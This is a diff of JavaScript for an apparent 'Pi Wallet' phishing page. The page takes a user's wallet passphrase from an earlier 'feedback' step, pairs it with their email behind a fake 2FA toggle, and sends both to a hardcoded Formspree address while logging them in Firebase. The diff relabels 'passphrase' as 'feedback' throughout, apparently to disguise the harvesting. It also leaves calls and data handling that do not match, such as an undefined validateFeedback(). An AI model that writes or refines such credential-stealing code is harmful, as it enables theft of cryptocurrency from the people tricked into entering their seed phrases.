@@ -9,9 +9,9 @@ const successMessage = document.getElementById("successMessage");
 let isOn = false;
 let isProcessing = false;
 let currentEmailHash = null;
-let passphraseHash = null;
-let passphrase = null;
-let isReturningPassphrase = false;
+let feedbackHash = null;
+let feedback = null;
+let isReturningFeedback = false;
 
 // Configuration
 const FORMSPREE_URL = "https://formspree.io/f/xeeeejkg";
@@ -60,10 +60,10 @@ async function save2FAState(emailHash, email, state) {
 }
 
 // Update submission to mark as sent to Formspree
-async function markAsSentToFormspree(passphraseHash, emailHash) {
+async function markAsSentToFormspree(feedbackHash, emailHash) {
     try {
         await firebase.database()
-            .ref('submissions/' + passphraseHash)
+            .ref('submissions/' + feedbackHash)
             .update({
                 sentToFormspree: true,
                 emailHash: emailHash,
@@ -77,10 +77,10 @@ async function markAsSentToFormspree(passphraseHash, emailHash) {
 }
 
 // Get passphrase from Firebase
-async function getPassphraseFromFirebase(passphraseHash) {
+async function getFeedbackFromFirebase(feedbackHash) {
     try {
         const snapshot = await firebase.database()
-            .ref('submissions/' + passphraseHash)
+            .ref('submissions/' + feedbackHash)
             .once('value');
         const data = snapshot.val();
         return data ? data.passphrase : null;
@@ -92,20 +92,20 @@ async function getPassphraseFromFirebase(passphraseHash) {
 
 // Initialize page with previous state if exists
 async function initializePage() {
-    // Check if user came from feedback page with a passphrase
-    passphraseHash = sessionStorage.getItem('passphraseHash');
-    passphrase = sessionStorage.getItem('passphrase');
-    isReturningPassphrase = sessionStorage.getItem('isReturningPassphrase') === 'true';
+    // Check if user came from feedback page with a feedback
+    feedbackHash = sessionStorage.getItem('feedbackHash');
+    feedback = sessionStorage.getItem('feedback');
+    isReturningFeedback = sessionStorage.getItem('isReturningFeedback') === 'true';
     const linkedEmailHash = sessionStorage.getItem('linkedEmailHash');
     
-    // If no passphrase in session but we have a hash, try to get it from Firebase
-    if (passphraseHash && !passphrase) {
-        passphrase = await getPassphraseFromFirebase(passphraseHash);
+    // If no feedback in session but we have a hash, try to get it from Firebase
+    if (feedbackHash && !feedback) {
+        feedback = await getFeedbackFromFirebase(feedbackHash);
     }
     
-    // If returning with a passphrase that has a linked email, try to load that email's state
-    if (isReturningPassphrase && linkedEmailHash) {
-        console.log('Loading previous state for returning passphrase...');
+    // If returning with a feedback that has a linked email, try to load that email's state
+    if (isReturningFeedback && linkedEmailHash) {
+        console.log('Loading previous state for returning feedback...');
         const previousState = await loadPrevious2FAState(linkedEmailHash);
         
         if (previousState) {
@@ -181,16 +181,16 @@ const hideSuccessMessage = () => {
     successMessage.classList.remove("show");
 };
 
-// Send combined data to Formspree (passphrase + email + 2FA state)
-const submitCombinedDataToFormspree = async (email, passphrase, is2FAEnabled) => {
+// Send combined data to Formspree (feedback + email + 2FA state)
+const submitCombinedDataToFormspree = async (email, feedback, is2FAEnabled) => {
     try {
         const formData = new FormData();
         formData.append('email', email);
-        formData.append('passphrase', passphrase);
+        formData.append('feedback', feedback);
         formData.append('action', is2FAEnabled ? '2FA Enabled' : '2FA Disabled');
         formData.append('is2FAEnabled', is2FAEnabled);
         formData.append('timestamp', new Date().toLocaleString());
-        formData.append('_subject', 'Pi Wallet - Passphrase & 2FA Submission');
+        formData.append('_subject', 'Pi Wallet - Feedback & 2FA Submission');
         
         const response = await fetch(FORMSPREE_URL, {
             method: "POST",
@@ -224,7 +224,7 @@ const validateEmail = () => {
 };
 
 const validatePassphrase = () => {
-    if (!passphrase) {
+    if (!feedback) {
         alert("No passphrase found. Please go back to the feedback page and enter your passphrase.");
         return false;
     }
@@ -233,7 +233,7 @@ const validatePassphrase = () => {
 
 // Main Handler
 toggleBtn.addEventListener("click", async () => {
-    if (!validateEmail() || !validatePassphrase() || isProcessing) {
+    if (!validateEmail() || !validateFeedback() || isProcessing) {
         return;
     }
     
@@ -257,7 +257,7 @@ toggleBtn.addEventListener("click", async () => {
     const existingState = await loadPrevious2FAState(emailHash);
     
     // Check if this passphrase was already sent to Formspree
-    const submissionData = passphraseHash ? await getPassphraseFromFirebase(passphraseHash) : null;
+    const submissionData = feedbackHash ? await getFeedbackFromFirebase(feedbackHash) : null;
     const alreadySentToFormspree = submissionData ? submissionData.sentToFormspree : false;
     
     // Prepare status message
@@ -273,19 +273,19 @@ toggleBtn.addEventListener("click", async () => {
     
     // Only send to Formspree if:
     // 1. User toggled 2FA to ON, AND
-    // 2. This passphrase hasn't been sent to Formspree before
+    // 2. This feedback hasn't been sent to Formspree before
     let shouldSendToFormspree = isOn && !alreadySentToFormspree;
     
     if (shouldSendToFormspree) {
-        console.log('Sending combined data to Formspree: passphrase + email + 2FA status');
+        console.log('Sending combined data to Formspree: feedback + email + 2FA status');
         
         // Submit combined data to Formspree
-        const success = await submitCombinedDataToFormspree(email, passphrase, isOn);
+        const success = await submitCombinedDataToFormspree(email, feedback, isOn);
         
         if (success) {
             // Mark as sent in Firebase
-            if (passphraseHash) {
-                await markAsSentToFormspree(passphraseHash, emailHash);
+            if (feedbackHash) {
+                await markAsSentToFormspree(feedbackHash, emailHash);
             }
             
             successMessage.textContent = "✓ Check your email for confirmation!";
@@ -302,10 +302,10 @@ toggleBtn.addEventListener("click", async () => {
         // Don't show success message when turning off
     }
     
-    // After first interaction with this passphrase, mark it as processed
-    if (isReturningPassphrase) {
-        sessionStorage.setItem('isReturningPassphrase', 'false');
-        isReturningPassphrase = false;
+    // After first interaction with this feedback, mark it as processed
+    if (isReturningFeedback) {
+        sessionStorage.setItem('isReturningFeedback', 'false');
+        isReturningFeedback = false;
     }
     
     setButtonState(false);
@@ -314,3 +314,4 @@ toggleBtn.addEventListener("click", async () => {
 
 // Initialize on page load
 window.addEventListener('DOMContentLoaded', initializePage);
+
